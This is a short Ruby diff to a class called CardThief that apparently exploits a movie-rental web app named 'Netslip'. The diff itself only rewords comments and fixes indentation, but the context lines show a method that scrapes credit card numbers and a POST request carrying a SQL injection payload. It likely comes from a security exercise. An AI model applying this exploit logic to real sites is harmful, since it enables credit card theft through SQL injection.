@@ -44,8 +44,8 @@ class CardThief
 	# This method returns an array of CreditCard objects.
 	#
 	# It calls fetchRawCreditCardInfo to get the raw
-	# info from the Netslip server, parses out the credit card
-	# info into an array of CreditCard objects.
+	# info from the Netslip server and parses out the credit 
+	# card info into an array of CreditCard objects.
 	def stealCreditCardInfo()
 		card_info_regex = /<td><a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/
 
@@ -83,8 +83,8 @@ class CardThief
 		token_and_cookie = getAuthTokenAndSessionCookie()
 		auth_token = token_and_cookie[0]; session_cookie = token_and_cookie[1];
 
-	    # put the authenticity token as well as the SQL injection payload 
-	    # as url encoded parameters to the HTTP POST request 
+		# put the authenticity token as well as the SQL injection payload 
+		# as url encoded parameters to the HTTP POST request 
 		request_body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
 		   "genre=" + CGI::escape(egg) + "&" \
 		   "commit=Show+Movies\r\n\r\n"
